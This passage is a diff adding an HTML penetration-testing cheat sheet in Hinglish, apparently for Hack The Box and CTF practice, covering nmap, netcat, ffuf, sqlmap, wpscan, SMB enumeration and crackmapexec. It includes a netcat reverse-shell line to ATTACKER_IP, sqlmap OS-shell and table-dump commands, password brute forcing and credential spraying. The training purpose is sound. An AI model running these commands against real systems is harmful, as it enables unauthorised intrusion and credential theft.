@@ -1,0 +1,2339 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB Tools Bible — Karan</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html{height:auto;overflow-y:auto}
+body{background:#0d1117;color:#e6edf3;font-family:'Segoe UI',Arial,sans-serif;font-size:13px;padding:12px;overflow-y:auto;-webkit-overflow-scrolling:touch;min-height:100vh}
+
+/* TOP BANNER */
+.banner{background:linear-gradient(135deg,#161b22,#21262d);border:1px solid #30363d;border-radius:12px;padding:16px 18px;margin-bottom:14px;position:relative;overflow:hidden}
+.banner::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#f85149,#d29922,#3fb950,#58a6ff,#bc8cff)}
+.banner h1{font-size:18px;font-weight:900;color:#e6edf3;letter-spacing:.5px}
+.banner p{font-size:11px;color:#8b949e;margin-top:4px}
+.banner .tags{display:flex;gap:6px;margin-top:8px;flex-wrap:wrap}
+.badge{display:inline-block;padding:2px 9px;border-radius:20px;font-size:10px;font-weight:700;letter-spacing:.5px}
+.b-r{background:#3d1a1a;color:#f85149;border:1px solid #f8514944}
+.b-y{background:#2d2208;color:#d29922;border:1px solid #d2992244}
+.b-g{background:#0d2818;color:#3fb950;border:1px solid #3fb95044}
+.b-b{background:#0c1e3a;color:#58a6ff;border:1px solid #58a6ff44}
+.b-p{background:#1f1035;color:#bc8cff;border:1px solid #bc8cff44}
+
+/* WORKFLOW STRIP */
+.workflow{display:flex;align-items:center;gap:6px;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:10px 14px;margin-bottom:14px;flex-wrap:wrap;overflow-x:auto;-webkit-overflow-scrolling:touch}
+.wf-step{background:#21262d;border:1px solid #30363d;border-radius:6px;padding:5px 10px;font-size:11px;font-weight:700;color:#8b949e;white-space:nowrap}
+.wf-step.active{color:#3fb950;border-color:#3fb950}
+.wf-arrow{color:#30363d;font-size:12px}
+
+/* TABS */
+.tabs{display:flex;gap:4px;margin-bottom:12px;flex-wrap:wrap}
+.tab{padding:6px 12px;border:1px solid #30363d;border-radius:6px;background:#161b22;cursor:pointer;font-size:11px;font-weight:700;color:#8b949e;transition:all .2s}
+.tab:hover{border-color:#58a6ff;color:#58a6ff}
+.tab.on{background:#1f6feb22;border-color:#1f6feb;color:#58a6ff}
+.sheet{display:none}.sheet.on{display:block}
+
+/* TOOL CARD */
+.tool-card{background:#161b22;border:1px solid #30363d;border-radius:10px;margin-bottom:12px;overflow:visible}
+.tool-header{display:flex;align-items:center;gap:10px;padding:10px 14px;background:#1c2128;border-bottom:1px solid #30363d}
+.tool-icon{font-size:18px}
+.tool-name{font-size:15px;font-weight:900;color:#e6edf3}
+.tool-sub{font-size:11px;color:#8b949e;margin-left:auto}
+.tool-body{padding:12px 14px}
+
+/* WHAT/WHY/HOW */
+.what{background:#0d2818;border:1px solid #1a4731;border-radius:6px;padding:8px 12px;margin-bottom:10px;font-size:12px;line-height:1.8;color:#7ee787}
+.what b{color:#3fb950;font-size:11px;text-transform:uppercase;letter-spacing:1px;display:block;margin-bottom:3px}
+
+/* INSTALL */
+.install{background:#161b22;border:1px dashed #30363d;border-radius:6px;padding:7px 12px;margin-bottom:10px;font-family:'Courier New',monospace;font-size:11px;color:#8b949e}
+.install b{color:#58a6ff}
+
+/* CODE */
+.cmd-group{margin-bottom:12px}
+.cmd-label{font-size:10px;font-weight:700;color:#8b949e;text-transform:uppercase;letter-spacing:1px;margin-bottom:5px;padding-left:2px}
+.cmd{display:block;margin:5px 0;border-radius:6px;overflow:visible}
+.cmd-line{background:#0d1117;border:1px solid #21262d;border-bottom:none;color:#7ee787;font-family:'Courier New',monospace;font-size:12px;padding:7px 12px;line-height:1.6;border-radius:6px 6px 0 0;overflow-x:auto;-webkit-overflow-scrolling:touch;white-space:pre;display:block;width:100%}
+.cmd-line .fl{color:#79c0ff}   /* flags - blue */
+.cmd-line .arg{color:#ffa657}  /* args - orange */
+.cmd-line .cmt2{color:#484f58;font-style:italic} /* comment - gray */
+.cmd-desc{background:#161b22;border:1px solid #21262d;border-top:none;color:#8b949e;font-size:11px;padding:6px 10px;line-height:1.6;display:block;width:100%;border-radius:0 0 6px 6px}
+
+/* FLAGS TABLE */
+.flags{width:100%;border-collapse:collapse;font-size:11px;margin:8px 0;background:#0d1117;border-radius:6px;border:1px solid #21262d;display:block;overflow-x:auto;-webkit-overflow-scrolling:touch}
+.flags th{background:#1c2128;color:#58a6ff;padding:6px 10px;text-align:left;font-size:10px;letter-spacing:.5px;text-transform:uppercase}
+.flags td{padding:6px 10px;border-bottom:1px solid #21262d;vertical-align:top}
+.flags tr:last-child td{border-bottom:none}
+.flags td:first-child{color:#ffa657;font-family:'Courier New',monospace;font-size:11px;white-space:normal;word-break:break-all}
+.flags td:last-child{color:#8b949e;line-height:1.6}
+
+/* OUTPUT */
+.out-wrap{margin:8px 0}
+.out-label{background:#1c2128;color:#3fb950;font-size:10px;font-family:'Courier New',monospace;padding:3px 10px;border-radius:4px 4px 0 0;display:inline-block;border:1px solid #30363d;border-bottom:none}
+.out-box{background:#0d1117;border:1px solid #30363d;border-radius:0 4px 4px 4px;padding:9px 12px;font-family:'Courier New',monospace;font-size:11px;color:#3fb950;line-height:1.8;overflow-x:auto;-webkit-overflow-scrolling:touch;white-space:pre;display:block}
+
+/* WARN */
+.warn2{background:#2d1a0a;border:1px solid #6e4110;border-radius:6px;padding:8px 12px;margin:8px 0;font-size:12px;line-height:1.7;color:#d29922}
+.warn2 b{color:#ffa657}
+.tip2{background:#0c2a1f;border:1px solid #1a5c38;border-radius:6px;padding:8px 12px;margin:8px 0;font-size:12px;line-height:1.7;color:#7ee787}
+.tip2 b{color:#3fb950}
+.hack2{background:#1e0f35;border:1px solid #4a2080;border-radius:6px;padding:8px 12px;margin:8px 0;font-size:12px;line-height:1.7;color:#d2a8ff}
+.hack2 b{color:#bc8cff}
+
+/* WORKFLOW STEPS */
+.wfsteps{counter-reset:step}
+.wfstep{display:flex;gap:12px;padding:10px 0;border-bottom:1px solid #21262d}
+.wfstep:last-child{border-bottom:none}
+.wfstep-num{background:#1f6feb;color:#fff;font-weight:900;font-size:11px;padding:2px 8px;border-radius:4px;height:fit-content;flex-shrink:0;font-family:'Courier New',monospace}
+.wfstep-content{font-size:12px;line-height:1.8;color:#c9d1d9}
+.wfstep-content b{color:#e6edf3}
+.wfstep-content code{background:#21262d;color:#ffa657;padding:1px 6px;border-radius:3px;font-family:'Courier New',monospace;font-size:11px}
+
+/* CHEAT QUICK */
+.quick-grid{display:grid;grid-template-columns:1fr;gap:8px;margin:8px 0}
+.quick-card{background:#0d1117;border:1px solid #21262d;border-radius:6px;padding:9px 12px}
+.quick-card .qt{color:#58a6ff;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;margin-bottom:5px}
+.quick-card code{display:block;color:#7ee787;font-family:'Courier New',monospace;font-size:11px;padding:2px 0;line-height:1.7}
+.quick-card code .fl{color:#79c0ff}
+.quick-card code .arg{color:#ffa657}
+</style>
+</head>
+<body>
+
+<div class="banner">
+  <h1>💀 HTB & CTF Tools Bible</h1>
+  <p>Har tool — kya karta hai, kaise karte hain, kab karte hain | Karan ka Arsenal</p>
+  <div class="tags">
+    <span class="badge b-r">Recon</span>
+    <span class="badge b-y">Web</span>
+    <span class="badge b-g">SMB/Network</span>
+    <span class="badge b-b">Exploitation</span>
+    <span class="badge b-p">Post-Exploit</span>
+    <span class="badge b-r">Brute Force</span>
+    <span class="badge b-y">Hash Crack</span>
+    <span class="badge b-g">Crypto/Decode</span>
+  </div>
+</div>
+
+<!-- HTB WORKFLOW -->
+<div class="workflow">
+  <div class="wf-step active">IP Milta Hai</div>
+  <div class="wf-arrow">→</div>
+  <div class="wf-step active">Nmap Scan</div>
+  <div class="wf-arrow">→</div>
+  <div class="wf-step active">Services Enum</div>
+  <div class="wf-arrow">→</div>
+  <div class="wf-step active">Exploit Find</div>
+  <div class="wf-arrow">→</div>
+  <div class="wf-step active">Initial Access</div>
+  <div class="wf-arrow">→</div>
+  <div class="wf-step active">Priv Esc</div>
+  <div class="wf-arrow">→</div>
+  <div class="wf-step active">Root Flag 🚩</div>
+</div>
+
+<!-- TABS -->
+<div class="tabs">
+  <button class="tab on"   onclick="show('recon',this)">🗺️ Recon</button>
+  <button class="tab"      onclick="show('web',this)">🌐 Web</button>
+  <button class="tab"      onclick="show('smb',this)">📁 SMB/Net</button>
+  <button class="tab"      onclick="show('brute',this)">🔨 Brute Force</button>
+  <button class="tab"      onclick="show('hash',this)">🔑 Hash Crack</button>
+  <button class="tab"      onclick="show('exploit',this)">💣 Exploit</button>
+  <button class="tab"      onclick="show('shells',this)">🐚 Shells</button>
+  <button class="tab"      onclick="show('crypto',this)">🔒 Crypto/Decode</button>
+  <button class="tab"      onclick="show('privesc',this)">📈 Priv Esc</button>
+  <button class="tab"      onclick="show('workflow',this)">🎯 HTB Workflow</button>
+  <button class="tab"      onclick="show('burp',this)">🕷️ Burp Suite</button>
+  <button class="tab"      onclick="show('impacket',this)">🪟 Impacket</button>
+  <button class="tab"      onclick="show('ad',this)">🏰 AD/Kerberos</button>
+  <button class="tab"      onclick="show('network',this)">📡 Network</button>
+  <button class="tab"      onclick="show('moretools',this)">🧰 More Tools</button>
+  <button class="tab"      onclick="show('reveng',this)">🔬 Rev Eng</button>
+  <button class="tab"      onclick="show('pivoting',this)">🚇 Pivoting</button>
+  <button class="tab"      onclick="show('ports',this)">🔌 Ports Guide</button>
+</div>
+
+<!-- ═══════════════════ RECON ═══════════════════ -->
+<div class="sheet on" id="s-recon">
+
+<!-- NMAP -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔍</div>
+    <div>
+      <div class="tool-name">nmap</div>
+    </div>
+    <div class="tool-sub"><span class="badge b-r">Recon</span> <span class="badge b-g">Port Scanner</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Network pe kaunse ports open hain, kaunsi services chal rahi hain, kaunsa OS hai — ye sab pata karta hai. HTB mein sabse pehla tool!</div>
+
+    <div class="cmd-label">⚡ Pehla Scan — IP mili, ye karo sabse pehle</div>
+    <div class="cmd">
+      <div class="cmd-line">nmap <span class="fl">-sC -sV -oN</span> <span class="arg">initial.txt TARGET_IP</span></div>
+      <div class="cmd-desc">Default scripts + Version detect + Output file save</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">nmap <span class="fl">-p-</span> <span class="arg">TARGET_IP</span> <span class="fl">--min-rate</span> <span class="arg">5000</span> <span class="fl">-oN</span> <span class="arg">allports.txt</span></div>
+      <div class="cmd-desc">Sab 65535 ports scan karo — fast speed se</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">nmap <span class="fl">-sC -sV -p</span> <span class="arg">22,80,445</span> <span class="arg">TARGET_IP</span> <span class="fl">-oN</span> <span class="arg">targeted.txt</span></div>
+      <div class="cmd-desc">Sirf specific ports pe deep scan</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">nmap <span class="fl">-sU -p</span> <span class="arg">53,161,162</span> <span class="arg">TARGET_IP</span></div>
+      <div class="cmd-desc">UDP scan — DNS(53), SNMP(161)</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">nmap <span class="fl">-sV --script vuln</span> <span class="arg">TARGET_IP</span></div>
+      <div class="cmd-desc">Vulnerability scripts run karo</div>
+    </div>
+
+    <table class="flags">
+      <tr><th>Flag</th><th>Matlab</th></tr>
+      <tr><td>-sC</td><td>Default NSE scripts run karo (basic enum)</td></tr>
+      <tr><td>-sV</td><td>Service version detect karo (Apache 2.4.18 etc.)</td></tr>
+      <tr><td>-p-</td><td>Saare 65535 ports scan karo</td></tr>
+      <tr><td>-p 80,443</td><td>Sirf ye specific ports</td></tr>
+      <tr><td>-oN file</td><td>Normal text output file mein save karo</td></tr>
+      <tr><td>-oA base</td><td>Teen formats mein save (normal, xml, grep)</td></tr>
+      <tr><td>--min-rate 5000</td><td>Speed badhaao — 5000 packets/sec</td></tr>
+      <tr><td>-sU</td><td>UDP scan (slow hai)</td></tr>
+      <tr><td>-O</td><td>OS detection</td></tr>
+      <tr><td>-A</td><td>sC + sV + O sab ek saath (noisy)</td></tr>
+      <tr><td>-T4</td><td>Timing template 4 (fast)</td></tr>
+      <tr><td>-Pn</td><td>Ping skip karo — firewall ke peeche bhi kaam kare</td></tr>
+    </table>
+
+    <div class="out-wrap">
+      <div class="out-label">▶ Sample Output</div>
+      <div class="out-box">PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 8.2p1
+80/tcp  open  http        Apache httpd 2.4.41
+445/tcp open  microsoft-ds Samba smbd 4.x</div>
+    </div>
+    <div class="tip2"><b>💡 HTB Tip:</b> Pehle fast scan (-p- --min-rate 5000) karo — koi bhi port miss na ho. Phir open ports pe -sC -sV targeted scan karo!</div>
+  </div>
+</div>
+
+<!-- NETCAT -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔌</div>
+    <div><div class="tool-name">netcat (nc)</div></div>
+    <div class="tool-sub"><span class="badge b-r">Recon</span> <span class="badge b-p">Shells</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>TCP/UDP connections banana aur sunna. Swiss army knife! Port check karo, banner grab karo, reverse shell lo.</div>
+
+    <div class="cmd-label">⚡ Common Uses</div>
+    <div class="cmd">
+      <div class="cmd-line">nc <span class="fl">-zv</span> <span class="arg">TARGET_IP 80</span></div>
+      <div class="cmd-desc">Port 80 open hai kya? Quick check</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">nc <span class="arg">TARGET_IP 80</span></div>
+      <div class="cmd-desc">Connect karo — manually HTTP send karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">nc <span class="fl">-lvnp</span> <span class="arg">4444</span></div>
+      <div class="cmd-desc">Listen karo — reverse shell pakadne ke liye</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">nc <span class="fl">-e</span> /bin/bash <span class="arg">ATTACKER_IP 4444</span></div>
+      <div class="cmd-desc">Reverse shell bhejo (victim pe)</div>
+    </div>
+    <table class="flags">
+      <tr><th>Flag</th><th>Matlab</th></tr>
+      <tr><td>-l</td><td>Listen mode — connection wait karo</td></tr>
+      <tr><td>-v</td><td>Verbose — kya ho raha hai dikhao</td></tr>
+      <tr><td>-n</td><td>DNS lookup mat karo — fast</td></tr>
+      <tr><td>-p PORT</td><td>Kaunsa port pe suno</td></tr>
+      <tr><td>-z</td><td>Zero I/O — sirf port open check</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- MASSCAN -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">⚡</div>
+    <div><div class="tool-name">masscan</div></div>
+    <div class="tool-sub"><span class="badge b-r">Recon</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Nmap se 100x tez port scanner! Puri subnet ko seconds mein scan karo. HTB pro labs aur networks mein useful.</div>
+    <div class="cmd">
+      <div class="cmd-line">masscan <span class="fl">-p1-65535</span> <span class="arg">TARGET_IP</span> <span class="fl">--rate=10000</span></div>
+      <div class="cmd-desc">Ultra fast — sab ports</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">masscan <span class="arg">192.168.1.0/24</span> <span class="fl">-p80,443,22,445</span></div>
+      <div class="cmd-desc">Poori subnet common ports</div>
+    </div>
+  </div>
+</div>
+
+</div><!-- recon -->
+
+<!-- ═══════════════════ WEB ═══════════════════ -->
+<div class="sheet" id="s-web">
+
+<!-- GOBUSTER/FFUF -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🕵️</div>
+    <div><div class="tool-name">ffuf + gobuster</div></div>
+    <div class="tool-sub"><span class="badge b-y">Web</span> <span class="badge b-r">Fuzzing</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Web server pe hidden directories, files, subdomains dhundhta hai. Wordlist se har word try karta hai — jaise /admin, /backup, /login.</div>
+
+    <div class="cmd-label">🔥 ffuf — Fastest Web Fuzzer</div>
+    <div class="cmd">
+      <div class="cmd-line">ffuf <span class="fl">-u</span> <span class="arg">http://TARGET/FUZZ</span> <span class="fl">-w</span> <span class="arg">/usr/share/wordlists/dirb/common.txt</span></div>
+      <div class="cmd-desc">Basic directory fuzzing</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">ffuf <span class="fl">-u</span> <span class="arg">http://TARGET/FUZZ</span> <span class="fl">-w</span> <span class="arg">wordlist.txt</span> <span class="fl">-e</span> <span class="arg">.php,.html,.txt,.bak</span></div>
+      <div class="cmd-desc">Extensions ke saath — file dhundho</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">ffuf <span class="fl">-u</span> <span class="arg">http://TARGET/FUZZ</span> <span class="fl">-w</span> <span class="arg">wordlist.txt</span> <span class="fl">-fc</span> <span class="arg">404</span> <span class="fl">-o</span> <span class="arg">results.txt</span></div>
+      <div class="cmd-desc">404 filter karo, results save karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">ffuf <span class="fl">-u</span> <span class="arg">http://FUZZ.target.com/</span> <span class="fl">-w</span> <span class="arg">subdomains.txt</span> <span class="fl">-H</span> <span class="arg">"Host: FUZZ.target.com"</span></div>
+      <div class="cmd-desc">Subdomain / VHOST fuzzing</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">ffuf <span class="fl">-u</span> <span class="arg">http://TARGET/login</span> <span class="fl">-X POST -d</span> <span class="arg">"user=FUZZ&pass=admin"</span> <span class="fl">-w</span> <span class="arg">users.txt</span></div>
+      <div class="cmd-desc">POST data fuzzing — username bruteforce</div>
+    </div>
+
+    <div class="cmd-label">🔥 gobuster — Directory/DNS Brute</div>
+    <div class="cmd">
+      <div class="cmd-line">gobuster dir <span class="fl">-u</span> <span class="arg">http://TARGET</span> <span class="fl">-w</span> <span class="arg">/usr/share/wordlists/dirb/common.txt</span></div>
+      <div class="cmd-desc">Directory mode</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">gobuster dir <span class="fl">-u</span> <span class="arg">http://TARGET</span> <span class="fl">-w</span> <span class="arg">wordlist.txt</span> <span class="fl">-x</span> <span class="arg">php,html,txt</span> <span class="fl">-t</span> <span class="arg">50</span></div>
+      <div class="cmd-desc">Extensions + 50 threads</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">gobuster dns <span class="fl">-d</span> <span class="arg">target.com</span> <span class="fl">-w</span> <span class="arg">subdomains.txt</span></div>
+      <div class="cmd-desc">DNS subdomain enumeration</div>
+    </div>
+
+    <table class="flags">
+      <tr><th>Flag (ffuf)</th><th>Matlab</th></tr>
+      <tr><td>FUZZ</td><td>Yahan wordlist se word aayega</td></tr>
+      <tr><td>-u URL</td><td>Target URL</td></tr>
+      <tr><td>-w wordlist</td><td>Wordlist file</td></tr>
+      <tr><td>-e .php,.html</td><td>Extensions try karo</td></tr>
+      <tr><td>-fc 404,403</td><td>Ye status codes filter karo (hide)</td></tr>
+      <tr><td>-mc 200,301</td><td>Sirf ye status codes dikhao</td></tr>
+      <tr><td>-t 100</td><td>100 threads (speed)</td></tr>
+      <tr><td>-o file</td><td>Results save karo</td></tr>
+      <tr><td>-H "header"</td><td>Custom header add karo</td></tr>
+    </table>
+
+    <div class="tip2"><b>💡 Best Wordlists:</b><br>
+/usr/share/wordlists/dirb/common.txt — basic<br>
+/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt — bhara<br>
+/usr/share/seclists/Discovery/DNS/subdomains-top1million.txt — subdomains</div>
+  </div>
+</div>
+
+<!-- NIKTO -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🩺</div>
+    <div><div class="tool-name">nikto</div></div>
+    <div class="tool-sub"><span class="badge b-y">Web</span> <span class="badge b-r">Vuln Scanner</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Web server pe automatic vulnerability scan karta hai — outdated software, dangerous files, misconfigurations dhundhta hai.</div>
+    <div class="cmd">
+      <div class="cmd-line">nikto <span class="fl">-h</span> <span class="arg">http://TARGET</span></div>
+      <div class="cmd-desc">Basic scan</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">nikto <span class="fl">-h</span> <span class="arg">http://TARGET</span> <span class="fl">-o</span> <span class="arg">nikto_out.txt</span> <span class="fl">-Format txt</span></div>
+      <div class="cmd-desc">Output file mein save karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">nikto <span class="fl">-h</span> <span class="arg">TARGET</span> <span class="fl">-port</span> <span class="arg">8080</span> <span class="fl">-ssl</span></div>
+      <div class="cmd-desc">Custom port + HTTPS</div>
+    </div>
+    <div class="warn2"><b>⚠️ Noisy!</b> Nikto bahut noisy hota hai — IDS/WAF detect kar lega. CTF mein OK, real pentest mein careful!</div>
+  </div>
+</div>
+
+<!-- SQLMAP -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">💉</div>
+    <div><div class="tool-name">sqlmap</div></div>
+    <div class="tool-sub"><span class="badge b-y">Web</span> <span class="badge b-r">SQLi</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>SQL Injection automatically detect aur exploit karta hai! Database dump karo, tables nikalo, even OS commands run karo.</div>
+    <div class="cmd">
+      <div class="cmd-line">sqlmap <span class="fl">-u</span> <span class="arg">"http://TARGET/page?id=1"</span></div>
+      <div class="cmd-desc">Basic GET parameter test</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">sqlmap <span class="fl">-u</span> <span class="arg">"http://TARGET/page?id=1"</span> <span class="fl">--dbs</span></div>
+      <div class="cmd-desc">Sab databases list karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">sqlmap <span class="fl">-u</span> <span class="arg">"http://TARGET/page?id=1"</span> <span class="fl">-D</span> <span class="arg">dbname</span> <span class="fl">--tables</span></div>
+      <div class="cmd-desc">Specific DB ki tables nikalo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">sqlmap <span class="fl">-u</span> <span class="arg">"http://TARGET/page?id=1"</span> <span class="fl">-D</span> <span class="arg">dbname</span> <span class="fl">-T</span> <span class="arg">users</span> <span class="fl">--dump</span></div>
+      <div class="cmd-desc">users table ka poora data nikalo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">sqlmap <span class="fl">-r</span> <span class="arg">request.txt</span> <span class="fl">--level=5 --risk=3</span></div>
+      <div class="cmd-desc">Burp request file se — aggressive mode</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">sqlmap <span class="fl">-u</span> <span class="arg">"URL"</span> <span class="fl">--os-shell</span></div>
+      <div class="cmd-desc">OS shell lene ki koshish karo</div>
+    </div>
+  </div>
+</div>
+
+<!-- WPSCAN -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔵</div>
+    <div><div class="tool-name">wpscan + whatweb</div></div>
+    <div class="tool-sub"><span class="badge b-y">Web</span> <span class="badge b-r">CMS</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>wpscan = WordPress ki vulnerabilities dhundho. whatweb = site pe kaunsi technology use ho rahi hai pata karo.</div>
+    <div class="cmd">
+      <div class="cmd-line">whatweb <span class="arg">http://TARGET</span></div>
+      <div class="cmd-desc">Tech stack identify karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">wpscan <span class="fl">--url</span> <span class="arg">http://TARGET</span> <span class="fl">-e u,p</span></div>
+      <div class="cmd-desc">Users aur plugins enumerate karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">wpscan <span class="fl">--url</span> <span class="arg">http://TARGET</span> <span class="fl">-U</span> <span class="arg">admin</span> <span class="fl">-P</span> <span class="arg">rockyou.txt</span></div>
+      <div class="cmd-desc">Password brute force</div>
+    </div>
+  </div>
+</div>
+
+</div><!-- web -->
+
+<!-- ═══════════════════ SMB/NETWORK ═══════════════════ -->
+<div class="sheet" id="s-smb">
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">📁</div>
+    <div><div class="tool-name">smbclient</div></div>
+    <div class="tool-sub"><span class="badge b-g">SMB</span> <span class="badge b-r">Port 445</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>SMB shares se connect karo — FTP jaise interface milta hai. Files download/upload karo, shares dekho. HTB mein bahut common!</div>
+    <div class="cmd">
+      <div class="cmd-line">smbclient <span class="fl">-L</span> <span class="arg">//TARGET_IP</span> <span class="fl">-N</span></div>
+      <div class="cmd-desc">Shares list karo — no password</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">smbclient <span class="arg">//TARGET_IP/sharename</span> <span class="fl">-N</span></div>
+      <div class="cmd-desc">Anonymous access — share connect karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">smbclient <span class="arg">//TARGET_IP/sharename</span> <span class="fl">-U</span> <span class="arg">username</span></div>
+      <div class="cmd-desc">Username ke saath login</div>
+    </div>
+    <table class="flags">
+      <tr><th>SMB Commands (andar jake)</th><th>Kaam</th></tr>
+      <tr><td>ls</td><td>Files list karo</td></tr>
+      <tr><td>get filename</td><td>File download karo</td></tr>
+      <tr><td>put file</td><td>File upload karo</td></tr>
+      <tr><td>cd folder</td><td>Folder change karo</td></tr>
+      <tr><td>mget *</td><td>Sab files download karo</td></tr>
+    </table>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔎</div>
+    <div><div class="tool-name">enum4linux + smbmap</div></div>
+    <div class="tool-sub"><span class="badge b-g">SMB</span> <span class="badge b-r">Enumeration</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>SMB/Samba se information nikalo — users, groups, shares, password policy, OS info sab kuch!</div>
+    <div class="cmd">
+      <div class="cmd-line">enum4linux <span class="fl">-a</span> <span class="arg">TARGET_IP</span></div>
+      <div class="cmd-desc">Full enumeration — sab kuch</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">enum4linux <span class="fl">-U</span> <span class="arg">TARGET_IP</span></div>
+      <div class="cmd-desc">Sirf users list karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">enum4linux-ng <span class="arg">TARGET_IP</span> <span class="fl">-A</span></div>
+      <div class="cmd-desc">New version — zyada features</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">smbmap <span class="fl">-H</span> <span class="arg">TARGET_IP</span></div>
+      <div class="cmd-desc">Shares aur permissions dekho</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">smbmap <span class="fl">-H</span> <span class="arg">TARGET_IP</span> <span class="fl">-u</span> <span class="arg">user</span> <span class="fl">-p</span> <span class="arg">password</span></div>
+      <div class="cmd-desc">Auth ke saath</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">smbmap <span class="fl">-H</span> <span class="arg">TARGET_IP</span> <span class="fl">-r</span> <span class="arg">sharename</span></div>
+      <div class="cmd-desc">Share ke andar recursively dekho</div>
+    </div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🗺️</div>
+    <div><div class="tool-name">crackmapexec (cme/nxc)</div></div>
+    <div class="tool-sub"><span class="badge b-g">SMB/WinRM</span> <span class="badge b-b">Post-Exploit</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Windows networks ka Swiss army knife! SMB, WinRM, LDAP, RDP pe authentication test karo, credentials spray karo, commands run karo.</div>
+    <div class="cmd">
+      <div class="cmd-line">crackmapexec smb <span class="arg">TARGET_IP</span></div>
+      <div class="cmd-desc">OS info, hostname, domain</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">crackmapexec smb <span class="arg">TARGET_IP</span> <span class="fl">-u</span> <span class="arg">admin</span> <span class="fl">-p</span> <span class="arg">password123</span></div>
+      <div class="cmd-desc">Login test karo</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">crackmapexec smb <span class="arg">TARGET_IP</span> <span class="fl">-u</span> <span class="arg">users.txt</span> <span class="fl">-p</span> <span class="arg">passwords.txt</span></div>
+      <div class="cmd-desc">Credential spray</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">crackmapexec smb <span class="arg">TARGET_IP</span> <span class="fl">-u</span> <span class="arg">admin</span> <span class="fl">-p</span> <span class="arg">pass</span> <span class="fl">--shares</span></div>
+      <div class="cmd-desc">Authenticated shares list</div>
+    </div>
+    <div class="cmd">
+      <div class="cmd-line">crackmapexec winrm <span class="arg">TARGET_IP</span> <span class="fl">-u</span> <span class="arg">admin</span> <span class="fl">-p</span> <span class="arg">pass</span> <span class="fl">-x</span> <span class="arg">"whoami"</span></div>
+      <div class="cmd-desc">WinRM se command run karo</div>
+    </div>
+    <div class="tip2"><b>💡 Pwned!</b> Agar (Pwned!) ata hai to credentials sahi hain aur full admin access hai!</div>
+  </div>
+</div>
+
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🖥️</div>
+    <div><div class="tool-name">evil-winrm</div></div>
+    <div class="tool-sub"><span class="badge b-g">Windows</span> <span class="badge b-b">Remote Shell</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Kya karta hai</b>Windows Remote Management (WinRM) se PowerShell shell lo. Port 5985/5986 pe kaam karta hai. HTB Windows machines pe bahut use hota hai!</div>
+    <div class="cmd">
